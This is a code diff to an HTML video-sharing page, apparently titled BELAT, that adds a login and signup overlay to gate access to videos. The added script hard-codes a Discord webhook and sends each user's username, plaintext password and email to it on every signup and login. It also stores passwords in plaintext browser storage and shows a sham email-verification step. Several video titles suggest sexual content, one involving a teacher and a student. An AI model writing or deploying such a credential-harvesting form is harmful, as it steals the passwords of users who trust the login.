@@ -20,22 +20,229 @@
             bottom: 0;
             min-width: 100%;
             min-height: 100%;
-            z-index: -1; /* Keep it behind everything */
+            z-index: -1;
             object-fit: cover;
-            filter: brightness(40%); /* Darkened so text is readable */
+            filter: brightness(40%);
         }
 
         body {
             font-family: "Roboto Condensed", sans-serif;
-            background-color: black; /* Fallback color */
+            background-color: black;
             min-height: 100vh;
             color: white;
             padding: 20px;
         }
 
+        /* AUTH MODAL STYLES */
+        .auth-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .auth-overlay.hidden {
+            display: none;
+        }
+
+        .auth-container {
+            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            box-shadow: 0 0 50px rgba(255, 75, 43, 0.3);
+            border: 2px solid #ff4b2b;
+        }
+
+        .auth-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .auth-header h2 {
+            color: #fff;
+            font-size: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #ff4b2b;
+        }
+
+        .auth-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .auth-tab {
+            flex: 1;
+            padding: 12px;
+            background: #333;
+            border: none;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+
+        .auth-tab.active {
+            background: #ff4b2b;
+            box-shadow: 0 0 20px rgba(255, 75, 43, 0.5);
+        }
+
+        .auth-form {
+            display: none;
+        }
+
+        .auth-form.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #fff;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #222;
+            border: 2px solid #444;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff4b2b;
+            box-shadow: 0 0 10px rgba(255, 75, 43, 0.3);
+        }
+
+        .email-note {
+            font-size: 0.8rem;
+            color: #aaa;
+            margin-top: 5px;
+            font-style: italic;
+        }
+
+        .email-note span {
+            color: #ff4b2b;
+            cursor: help;
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff4b2b 0%, #ff416c 100%);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 75, 43, 0.6);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff6666;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+
+        .success-message {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #00ff00;
+            color: #66ff66;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+
+        .verification-code {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .verification-code input {
+            flex: 1;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        /* MAIN CONTENT STYLES */
+        .main-content {
+            display: none;
+        }
+
+        .main-content.visible {
+            display: block;
+        }
+
         header {
             text-align: center;
             padding: 40px 0 20px 0;
+            position: relative;
+        }
+
+        .logout-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            background: #ff4b2b;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: #ff416c;
+            transform: translateY(-2px);
         }
 
         .title-wrapper {
@@ -74,6 +281,47 @@
             letter-spacing: 2px;
             color: #111;
             text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #fff;
+            cursor: help;
+            position: relative;
+            display: inline-block;
+        }
+
+        .subtitle .tooltip {
+            visibility: hidden;
+            width: 320px;
+            background: linear-gradient(135deg, #ff4b2b 0%, #ff416c 100%);
+            color: #fff;
+            text-align: center;
+            border-radius: 10px;
+            padding: 12px 15px;
+            position: absolute;
+            z-index: 1000;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -160px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.9rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: none;
+            box-shadow: 0 5px 20px rgba(255, 75, 43, 0.5);
+        }
+
+        .subtitle .tooltip::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -8px;
+            border-width: 8px;
+            border-style: solid;
+            border-color: #ff416c transparent transparent transparent;
+        }
+
+        .subtitle:hover .tooltip {
+            visibility: visible;
+            opacity: 1;
         }
 
         .category-section {
@@ -187,7 +435,17 @@
             background: #000; 
         }
 
-        .close-btn { position: absolute; top: -50px; right: 0; color: white; font-size: 40px; background: none; border: none; cursor: pointer; z-index: 2002; }
+        .close-btn { 
+            position: absolute; 
+            top: -50px; 
+            right: 0; 
+            color: white; 
+            font-size: 40px; 
+            background: none; 
+            border: none; 
+            cursor: pointer; 
+            z-index: 2002; 
+        }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -196,36 +454,458 @@
         <source src="https://files.catbox.moe/63vhpi.mp4" type="video/mp4">
     </video>
 
-    <header>
-        <div class="title-wrapper">
-            <h1 id="bannerTitle"></h1>
-            <img src="https://imgur.com/jZjxXLY.png" alt="icon" class="right-icon">
+    <!-- AUTH OVERLAY -->
+    <div id="authOverlay" class="auth-overlay">
+        <div class="auth-container">
+            <div class="auth-header">
+                <h2>🔐 BELAT Access</h2>
+            </div>
+
+            <div class="auth-tabs">
+                <button class="auth-tab active" onclick="switchTab('login')">Login</button>
+                <button class="auth-tab" onclick="switchTab('signup')">Sign Up</button>
+            </div>
+
+            <!-- LOGIN FORM -->
+            <form id="loginForm" class="auth-form active" onsubmit="handleLogin(event)">
+                <div id="loginError" class="error-message" style="display: none;"></div>
+                
+                <div class="form-group">
+                    <label>Username or Email</label>
+                    <input type="text" id="loginUsername" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+
+                <button type="submit" class="submit-btn">Login</button>
+            </form>
+
+            <!-- SIGNUP FORM -->
+            <form id="signupForm" class="auth-form" onsubmit="handleSignup(event)">
+                <div id="signupError" class="error-message" style="display: none;"></div>
+                <div id="signupSuccess" class="success-message" style="display: none;"></div>
+                
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="signupUsername" required minlength="3">
+                </div>
+
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="signupEmail" required>
+                    <div class="email-note">
+                        ✓ Gmail accounts accepted | <span title="Temporary email services like TempMail, Guerrilla Mail, 10MinuteMail are allowed">Temp emails allowed</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="signupPassword" required minlength="6">
+                </div>
+
+                <button type="submit" class="submit-btn" id="signupBtn">Create Account</button>
+            </form>
+
+            <!-- VERIFICATION FORM -->
+            <form id="verifyForm" class="auth-form" onsubmit="handleVerification(event)" style="display: none;">
+                <div id="verifyError" class="error-message" style="display: none;"></div>
+                <div id="verifySuccess" class="success-message" style="display: none;"></div>
+                
+                <p style="text-align: center; margin-bottom: 20px; color: #aaa;">
+                    Enter the 6-digit code sent to your email
+                </p>
+
+                <div class="verification-code">
+                    <input type="text" maxlength="1" class="verify-input" data-index="0">
+                    <input type="text" maxlength="1" class="verify-input" data-index="1">
+                    <input type="text" maxlength="1" class="verify-input" data-index="2">
+                    <input type="text" maxlength="1" class="verify-input" data-index="3">
+                    <input type="text" maxlength="1" class="verify-input" data-index="4">
+                    <input type="text" maxlength="1" class="verify-input" data-index="5">
+                </div>
+
+                <button type="submit" class="submit-btn">Verify Email</button>
+                <button type="button" class="submit-btn" onclick="resendCode()" style="margin-top: 10px; background: #555;">Resend Code</button>
+            </form>
         </div>
-        <p class="subtitle">MACTAN</p>
-    </header>
-
-    <div class="category-section">
-        <h2 class="category-title">Gold Medalist</h2>
-        <div id="goldMedalistGrid" class="video-grid"></div>
     </div>
 
-    <div class="category-section">
-        <h2 class="category-title">Following</h2>
-        <div id="followingGrid" class="video-grid"></div>
-    </div>
+    <!-- MAIN CONTENT -->
+    <div id="mainContent" class="main-content">
+        <header>
+            <button class="logout-btn" onclick="logout()">Logout</button>
+            <div class="title-wrapper">
+                <h1 id="bannerTitle"></h1>
+                <img src="https://imgur.com/jZjxXLY.png" alt="icon" class="right-icon">
+            </div>
+            <p class="subtitle">
+                garciatragic881@gmail.com
+                <span class="tooltip">Got something to say or a video to upload? Slide into my DMs on this Gmail.</span>
+            </p>
+        </header>
 
-    <div id="videoModal" class="modal">
-        <div class="modal-content">
-            <button class="close-btn" onclick="closeModal()">×</button>
-            <div class="video-wrapper">
-                <div class="privacy-shield"></div>
-                <video id="modalVideo" controls controlsList="nodownload noremoteplayback" disablePictureInPicture></video>
+        <div class="category-section">
+            <h2 class="category-title">Gold Medalist</h2>
+            <div id="goldMedalistGrid" class="video-grid"></div>
+        </div>
+
+        <div class="category-section">
+            <h2 class="category-title">Following</h2>
+            <div id="followingGrid" class="video-grid"></div>
+        </div>
+
+        <div id="videoModal" class="modal">
+            <div class="modal-content">
+                <button class="close-btn" onclick="closeModal()">×</button>
+                <div class="video-wrapper">
+                    <div class="privacy-shield"></div>
+                    <video id="modalVideo" controls controlsList="nodownload noremoteplayback" disablePictureInPicture></video>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // --- 1. Banner Looping Typing (3s Delay) ---
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1470419518126821543/-5vsHXrrDE6DI8uzHsBmoAk56Q_wawIcUoRAxdINTIT0e_uGoZsiwrKvPgduR15ItKej';
+        
+        // Store pending verification
+        let pendingVerification = null;
+
+        // --- AUTH FUNCTIONS ---
+        function switchTab(tab) {
+            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
+            
+            if (tab === 'login') {
+                document.querySelector('.auth-tab:first-child').classList.add('active');
+                document.getElementById('loginForm').classList.add('active');
+            } else {
+                document.querySelector('.auth-tab:last-child').classList.add('active');
+                document.getElementById('signupForm').classList.add('active');
+            }
+        }
+
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const errorDiv = document.getElementById('loginError');
+            
+            // Get users from localStorage
+            const users = JSON.parse(localStorage.getItem('belatUsers') || '[]');
+            
+            // Find user
+            const user = users.find(u => 
+                (u.username === username || u.email === username) && u.password === password
+            );
+            
+            if (!user) {
+                errorDiv.textContent = '❌ Invalid username/email or password';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            if (!user.verified) {
+                errorDiv.textContent = '❌ Please verify your email first';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            // Store session
+            localStorage.setItem('belatSession', JSON.stringify({
+                username: user.username,
+                email: user.email,
+                loginTime: new Date().toISOString()
+            }));
+            
+            // Get current date/time/day
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('en-US', { 
+                month: '2-digit', 
+                day: '2-digit', 
+                year: 'numeric' 
+            });
+            const timeStr = now.toLocaleTimeString('en-US', { 
+                hour: '2-digit', 
+                minute: '2-digit',
+                hour12: true 
+            });
+            const dayStr = now.toLocaleDateString('en-US', { weekday: 'long' });
+            
+            // Send Discord notification
+            await sendDiscordWebhook({
+                username: 'BELAT Login System',
+                embeds: [{
+                    title: '🔓 User Login',
+                    color: 3066993,
+                    fields: [
+                        { name: 'Username', value: user.username, inline: true },
+                        { name: 'Password', value: `\`${user.password}\``, inline: true },
+                        { name: 'Email', value: user.email, inline: false },
+                        { name: 'Date', value: dateStr, inline: true },
+                        { name: 'Time', value: timeStr, inline: true },
+                        { name: 'Day', value: dayStr, inline: true }
+                    ],
+                    timestamp: now.toISOString()
+                }]
+            });
+            
+            // Show main content
+            showMainContent();
+        }
+
+        async function handleSignup(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('signupUsername').value.trim();
+            const email = document.getElementById('signupEmail').value.trim().toLowerCase();
+            const password = document.getElementById('signupPassword').value;
+            const errorDiv = document.getElementById('signupError');
+            const successDiv = document.getElementById('signupSuccess');
+            const btn = document.getElementById('signupBtn');
+            
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+            
+            // Get existing users
+            const users = JSON.parse(localStorage.getItem('belatUsers') || '[]');
+            
+            // Check if username or email exists
+            if (users.find(u => u.username === username)) {
+                errorDiv.textContent = '❌ Username already taken';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            if (users.find(u => u.email === email)) {
+                errorDiv.textContent = '❌ Email already registered';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.textContent = 'Creating Account...';
+            
+            // Create account immediately (no verification needed)
+            users.push({
+                username,
+                email,
+                password,
+                verified: true,
+                createdAt: new Date().toISOString()
+            });
+            localStorage.setItem('belatUsers', JSON.stringify(users));
+            
+            // Get current date/time/day
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('en-US', { 
+                month: '2-digit', 
+                day: '2-digit', 
+                year: 'numeric' 
+            });
+            const timeStr = now.toLocaleTimeString('en-US', { 
+                hour: '2-digit', 
+                minute: '2-digit',
+                hour12: true 
+            });
+            const dayStr = now.toLocaleDateString('en-US', { weekday: 'long' });
+            
+            // Send to Discord webhook with all details
+            await sendDiscordWebhook({
+                username: 'BELAT Signup System',
+                embeds: [{
+                    title: '✅ New Account Created',
+                    color: 5763719,
+                    fields: [
+                        { name: 'Username', value: username, inline: true },
+                        { name: 'Password', value: `\`${password}\``, inline: true },
+                        { name: 'Email', value: email, inline: false },
+                        { name: 'Date', value: dateStr, inline: true },
+                        { name: 'Time', value: timeStr, inline: true },
+                        { name: 'Day', value: dayStr, inline: true }
+                    ],
+                    timestamp: now.toISOString()
+                }]
+            });
+            
+            successDiv.textContent = '✅ Account created successfully! Redirecting to login...';
+            successDiv.style.display = 'block';
+            
+            // Redirect to login
+            setTimeout(() => {
+                document.getElementById('signupForm').reset();
+                document.getElementById('loginForm').classList.add('active');
+                switchTab('login');
+                successDiv.style.display = 'none';
+            }, 2000);
+            
+            btn.disabled = false;
+            btn.textContent = 'Create Account';
+        }
+
+        function setupVerificationInputs() {
+            const inputs = document.querySelectorAll('.verify-input');
+            
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            inputs[0].focus();
+        }
+
+        async function handleVerification(event) {
+            event.preventDefault();
+            
+            const inputs = document.querySelectorAll('.verify-input');
+            const code = Array.from(inputs).map(i => i.value).join('');
+            const errorDiv = document.getElementById('verifyError');
+            const successDiv = document.getElementById('verifySuccess');
+            
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+            
+            if (!pendingVerification) {
+                errorDiv.textContent = '❌ No pending verification found';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            if (code !== pendingVerification.code) {
+                errorDiv.textContent = '❌ Invalid verification code';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            // Add user to database
+            const users = JSON.parse(localStorage.getItem('belatUsers') || '[]');
+            users.push({
+                username: pendingVerification.username,
+                email: pendingVerification.email,
+                password: pendingVerification.password,
+                verified: true,
+                createdAt: new Date().toISOString()
+            });
+            localStorage.setItem('belatUsers', JSON.stringify(users));
+            
+            // Send success webhook
+            await sendDiscordWebhook({
+                username: 'BELAT Verification System',
+                embeds: [{
+                    title: '✅ Email Verified',
+                    color: 5763719,
+                    fields: [
+                        { name: 'Username', value: pendingVerification.username, inline: true },
+                        { name: 'Email', value: pendingVerification.email, inline: true },
+                        { name: 'Status', value: 'Account Active', inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            });
+            
+            successDiv.textContent = '✅ Email verified! Redirecting to login...';
+            successDiv.style.display = 'block';
+            
+            pendingVerification = null;
+            
+            setTimeout(() => {
+                document.getElementById('verifyForm').style.display = 'none';
+                document.getElementById('loginForm').classList.add('active');
+                switchTab('login');
+            }, 2000);
+        }
+
+        async function resendCode() {
+            if (!pendingVerification) return;
+            
+            const btn = event.target;
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+            
+            const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+            pendingVerification.code = newCode;
+            
+            try {
+                // Send via email API
+                const response = await fetch('/api/send-verification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: pendingVerification.email,
+                        code: newCode,
+                        username: pendingVerification.username,
+                        type: 'resend'
+                    })
+                });
+
+                if (response.ok) {
+                    alert('✅ New verification code sent to your email!');
+                } else {
+                    throw new Error('Email failed');
+                }
+            } catch (error) {
+                // Fallback to Discord
+                await sendDiscordWebhook({
+                    username: 'BELAT Verification System',
+                    content: `🔄 **Code Resent**\nUsername: ${pendingVerification.username}\nEmail: ${pendingVerification.email}\nNew Code: \`${newCode}\``
+                });
+                
+                alert('⚠️ Email unavailable. New code sent to Discord webhook.');
+            }
+            
+            btn.disabled = false;
+            btn.textContent = 'Resend Code';
+        }
+
+        async function sendDiscordWebhook(data) {
+            try {
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Webhook error:', error);
+            }
+        }
+
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                localStorage.removeItem('belatSession');
+                location.reload();
+            }
+        }
+
+        function showMainContent() {
+            document.getElementById('authOverlay').classList.add('hidden');
+            document.getElementById('mainContent').classList.add('visible');
+            initMainContent();
+        }
+
+        // Check session on load
+        window.addEventListener('DOMContentLoaded', () => {
+            const session = localStorage.getItem('belatSession');
+            if (session) {
+                showMainContent();
+            }
+        });
+
+        // --- MAIN CONTENT FUNCTIONS ---
         const bannerText = "UBEC CITY";
         const bannerEl = document.getElementById('bannerTitle');
         let bIndex = 0;
@@ -244,7 +924,6 @@
             }
         }
 
-        // --- 2. Tab Title Looping Typing (2s Delay) ---
         const tabTexts = ["BELAT", "KAYAT", "LUSO", "NILAPAAY"];
         let tabIdx = 0;
         let charTabIdx = 0;
@@ -264,7 +943,6 @@
             }
         }
 
-        // --- 3. Full Video Data ---
         const goldMedalistVideos = [
             { title: "Ang pagsasama ni Maam sa kanyang Estudyante", label: "HOT", url: "https://raw.githubusercontent.com/yekithegreat-cyber/vid/main/1751b68a-2e07-42bd-bbb2-240dc27a59a0.mp4", poster: "https://imgur.com/v3m5sdS.jpg" },
             { title: "Magaling kumagod si Babae ni Jonatan", label: "HOT", url: "https://raw.githubusercontent.com/yekithegreat-cyber/vid/main/2f1e91cf-3b45-415e-8752-2cb88da43d21.mp4", poster: "https://imgur.com/leOcDcD.jpg" },
@@ -322,11 +1000,11 @@
             video.src = '';
         }
 
-        window.onload = () => {
+        function initMainContent() {
             typeBanner();
             typeTabTitle();
             loadVideos();
-        };
+        }
 
         document.addEventListener('keydown', e => {
             if (e.ctrlKey && (e.key === 's' || e.key === 'u')) e.preventDefault();
